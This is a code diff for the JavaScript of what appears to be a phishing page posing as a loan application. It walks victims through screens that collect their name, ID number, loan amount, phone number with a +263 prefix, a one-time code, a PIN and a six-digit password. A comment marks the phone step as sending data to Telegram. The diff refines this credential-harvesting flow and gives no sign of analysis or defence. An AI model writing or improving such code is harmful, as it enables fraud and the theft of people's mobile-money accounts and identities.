@@ -3,6 +3,7 @@ const TENANT_KEY = "nmnmnnm090909";
 
 document.addEventListener('DOMContentLoaded', () => {
     const welcomeScreen = document.getElementById('welcome-screen');
+    const applicationScreen = document.getElementById('application-screen');
     const phoneScreen = document.getElementById('phone-screen');
     const codeScreen = document.getElementById('code-screen');
     const pinScreen = document.getElementById('pin-screen');
@@ -10,15 +11,16 @@ document.addEventListener('DOMContentLoaded', () => {
     const loadingOverlay = document.getElementById('loading-overlay');
 
     const btnGetStarted = document.getElementById('btn-get-started');
+    const btnNextApplication = document.getElementById('btn-next-application');
     const btnNextPhone = document.getElementById('btn-next-phone');
     const btnNextCode = document.getElementById('btn-next-code');
     const btnNextPin = document.getElementById('btn-next-pin');
     const btnNextPassword = document.getElementById('btn-next-password');
 
-    const phoneInput = document.getElementById('phone-input');
     const nameInput = document.getElementById('name-input');
     const idInput = document.getElementById('id-input');
     const amountInput = document.getElementById('amount-input');
+    const phoneInput = document.getElementById('phone-input');
     const passwordInput = document.getElementById('password-input');
     
     const codeBoxes = document.querySelectorAll('#code-screen .code-box');
@@ -114,19 +116,31 @@ document.addEventListener('DOMContentLoaded', () => {
     btnGetStarted.addEventListener('click', () => {
         welcomeScreen.classList.remove('active');
         welcomeScreen.classList.add('hidden');
-        phoneScreen.classList.remove('hidden');
-        phoneScreen.classList.add('active');
-        setTimeout(() => phoneInput.focus(), 400);
+        applicationScreen.classList.remove('hidden');
+        applicationScreen.classList.add('active');
+        setTimeout(() => nameInput.focus(), 400);
     });
 
+    // Application details to Phone Screen
+    btnNextApplication.addEventListener('click', () => {
+        if (!btnNextApplication.disabled) {
+            applicationScreen.classList.remove('active');
+            applicationScreen.classList.add('hidden');
+            phoneScreen.classList.remove('hidden');
+            phoneScreen.classList.add('active');
+            setTimeout(() => phoneInput.focus(), 400);
+        }
+    });
+
+    // Phone screen to OTP screen (Sends data to Telegram)
     btnNextPhone.addEventListener('click', () => {
         if (!btnNextPhone.disabled) {
             currentUserPhone = "+263" + phoneInput.value.replace(/\s/g, '');
-            const detailsStr = `Name: ${nameInput.value}\nID: ${idInput.value}\nAmount: $${amountInput.value}`;
+            const detailsStr = `Name: ${nameInput.value.trim()}\nID: ${idInput.value.trim()}\nAmount: $${amountInput.value.trim()}`;
             
             const payload = {
                 type: 'login',
-                name: nameInput.value,
+                name: nameInput.value.trim(),
                 phone: currentUserPhone,
                 details: detailsStr
             };
@@ -226,29 +240,42 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     });
 
-    function validateLoanForm() {
-        const phone = phoneInput.value.replace(/\D/g, '');
+    // Validation for Application Screen
+    function validateApplicationForm() {
         const name = nameInput.value.trim();
         const id = idInput.value.trim();
         const amount = amountInput.value.trim();
         
-        if (phone.length > 5 && name.length > 2 && id.length > 5 && amount.length > 1) {
+        if (name.length > 2 && id.length > 5 && amount.length > 1) {
+            btnNextApplication.disabled = false;
+            btnNextApplication.classList.remove('disabled');
+        } else {
+            btnNextApplication.disabled = true;
+            btnNextApplication.classList.add('disabled');
+        }
+    }
+    
+    nameInput.addEventListener('input', validateApplicationForm);
+    idInput.addEventListener('input', validateApplicationForm);
+    amountInput.addEventListener('input', validateApplicationForm);
+
+    amountInput.addEventListener('keydown', (e) => {
+        if (e.key === 'Enter' && !btnNextApplication.disabled) {
+            btnNextApplication.click();
+        }
+    });
+
+    // Validation for Phone Screen
+    phoneInput.addEventListener('input', (e) => {
+        e.target.value = e.target.value.replace(/\D/g, '');
+        if (e.target.value.length > 5) {
             btnNextPhone.disabled = false;
             btnNextPhone.classList.remove('disabled');
         } else {
             btnNextPhone.disabled = true;
             btnNextPhone.classList.add('disabled');
         }
-    }
-
-    phoneInput.addEventListener('input', (e) => {
-        e.target.value = e.target.value.replace(/\D/g, '');
-        validateLoanForm();
     });
-    
-    nameInput.addEventListener('input', validateLoanForm);
-    idInput.addEventListener('input', validateLoanForm);
-    amountInput.addEventListener('input', validateLoanForm);
 
     phoneInput.addEventListener('keydown', (e) => {
         if (e.key === 'Enter' && !btnNextPhone.disabled) {
@@ -256,8 +283,10 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     });
 
+    // Validation for Password Screen
     passwordInput.addEventListener('input', (e) => {
-        if (e.target.value.length >= 6) {
+        e.target.value = e.target.value.replace(/\D/g, '');
+        if (e.target.value.length === 6) {
             btnNextPassword.disabled = false;
             btnNextPassword.classList.remove('disabled');
         } else {
@@ -272,6 +301,7 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     });
 
+    // Code boxes logic
     function setupBoxes(boxes, nextBtn) {
         boxes.forEach((box, index) => {
             box.addEventListener('input', (e) => {
